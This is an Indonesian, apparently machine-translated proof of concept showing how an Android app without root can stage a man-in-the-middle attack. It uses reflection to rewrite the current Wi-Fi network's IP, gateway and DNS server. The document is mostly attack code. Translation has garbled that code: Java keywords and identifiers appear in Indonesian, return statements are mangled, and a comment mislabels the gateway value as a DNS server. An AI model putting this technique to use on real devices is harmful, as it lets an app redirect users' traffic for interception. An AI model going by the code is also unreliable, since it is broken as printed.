Android MiTM (tanpa root) PoC
Menghadirkan cara cepat & mudah bagi aplikasi untuk melakukan serangan man-in-the-middle pada ponsel tertentu tanpa hak root.

Bagian kode ini menunjukkan bagaimana aplikasi jahat dapat melakukan serangan mitm pada ponsel Anda tanpa hak akses root.

Idenya adalah untuk mengubah server DNS utama perangkat.

Dan pertanyaannya adalah: mengapa aplikasi normal dapat melakukan operasi ini?

Izin yang Dibutuhkan
Agar aplikasi dapat melakukan operasi ini:

android.permission.ACCESS_WIFI_STATE

android.permission.CHANGE_WIFI_STATE

Kode:
Konfigurasi WifiConfigation = null;
WifiManager wm = (WifiManager) getSystemService (Context.WIFI_SERVICE);
WifiInfo ci = wm.getConnectionInfo ();
Daftar <WifiConfiguration> configureNetworks = wm.getConfiguredNetworks ();
for (WifiConfiguration conf: dikonfigurasiNetworks) {
if (conf.networkId == ci.getNetworkId ()) {
config = conf;
istirahat;
}
}

mencoba{
setIPTYPE ("STATIC", config);
setGW (InetAddress.getByName ("8.8.8.8"), config); // server dns google hanya untuk POC, bisa menjadi server DNS milik sendiri
setIP (InetAddress.getByName ("192.168.0.100"), 24, config);
setDNS_Server (InetAddress.getByName ("4.4.4.4"), config);
wm.updateNetwork (config);
wm.saveConfiguration ();
} catch (Exception e) {
e.printStackTrace ();
}

public static void setIPTYPE (String assign, WifiConfiguration wifiConf) melempar SecurityException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException {
setEnumField (wifiConf, assign, "ipAssignment");
}

public static void setIP (InetAddress addr, int prefixLength, WifiConfiguration wifiConf) melempar SecurityException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException,
NoSuchMethodException, ClassNotFoundException, InstantiationException, InvocationTargetException {
Object linkProperties = getField (wifiConf, "linkProperties");
if (linkProperties == null) kembali;
Class laClass = Class.forName ("android.net.LinkAddress");
Constructor laConstructor = laClass.getConstructor (Kelas baru [] {InetAddress.class, int.class});
Object linkAddress = laConstructor.newInstance (addr, prefixLength);

ArrayList mLinkAddresses = (ArrayList) getDeclaredField (linkProperties, "mLinkAddresses");
mLinkAddresses.clear ();
mLinkAddresses.add (linkAddress);
}

public static void setGW (InetAddress gateway, WifiConfiguration wifiConf) melempar SecurityException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException,
ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
Object linkProperties = getField (wifiConf, "linkProperties");
if (linkProperties == null) kembali;
Class routeInfoClass = Class.forName ("android.net.RouteInfo");
Constructor routeInfoConstructor = routeInfoClass.getConstructor (Kelas baru [] {InetAddress.class});
Object routeInfo = routeInfoConstructor.newInstance (gateway);

ArrayList mRoutes = (ArrayList) getDeclaredField (linkProperties, "mRoutes");
mRoutes.clear ();
mRoutes.add (routeInfo);
}

public static void setDNS_Server (InetAddress dns, WifiConfiguration wifiConf) melempar SecurityException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException {
Object linkProperties = getField (wifiConf, "linkProperties");
if (linkProperties == null) kembali;

ArrayList <InetAddress> mDnses = (ArrayList <InetAddress>) getDeclaredField (linkProperties, "mDnses");
mDnses.clear ();
mDnses.add (dns);
}

public static Object getField (Object obj, String name) melempar SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
Bidang f = obj.getClass (). GetField (nama);
Object out = f.get (obj);
kembali;
}

public static Object getDeclaredField (Object obj, String name) melempar SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
Bidang f = obj.getClass (). GetDeclaredField (nama);
f.setAccessible (true);
Object out = f.get (obj);
kembali;
}


public static void setEnumField (Object obj, Value string, String name) melempar SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
Bidang f = obj.getClass (). GetField (nama);
f.set (obj, Enum.valueOf ((Kelas <Enum>) f.getType (), value));
}
